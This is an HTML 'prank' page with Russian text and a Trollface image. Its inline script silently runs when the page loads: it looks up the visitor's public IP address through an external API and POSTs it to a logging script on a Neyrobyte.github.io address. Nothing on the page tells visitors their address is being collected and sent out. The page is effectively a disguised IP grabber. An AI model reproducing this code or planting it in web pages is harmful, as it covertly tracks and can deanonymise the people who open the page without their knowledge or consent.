<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Custom page</title>
    <style>
        body {
            justify-content: center;
            align-items: center;
            height: 85vh;
            margin: 10;
            background-color: #171717;
            font-family: Arial;
        }
        .null {
            width: 100%;
            margin: 0 auto;
            padding: 5px;
            /*background-color: #1d1d1d;*/
            /*border: 2px solid #222;*/
        }
        .container {
            width: 80%;
            margin: 10 auto;
            padding: 30px;
            background-color: #1d1d1d;
            border: 2px solid #222;
        }
        .header {
            text-align: center;
            font-size: 24px;
            color: #444;
        }
        .content {
            margin-top: 20px;
            font-size: 14px;
            color: #ddd;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h4>Бро, это пранк бро</h4>
            <img src="res/Trollface.png" alt="" width="200">
        </div>
        <div class="content">
        </div>
    </div>
    
    <script>
        // Используем внешний API для получения IP-адреса
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                console.log('Ваш IP-адрес:', ip);

                // Отправляем IP на сервер (например, на ваш PHP-скрипт)
                fetch('https://Neyrobyte.github.io/log-ip.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ ip: ip }),
                });
            })
            .catch(error => console.error('Ошибка при получении IP:', error));
    </script>
</body>
</html>
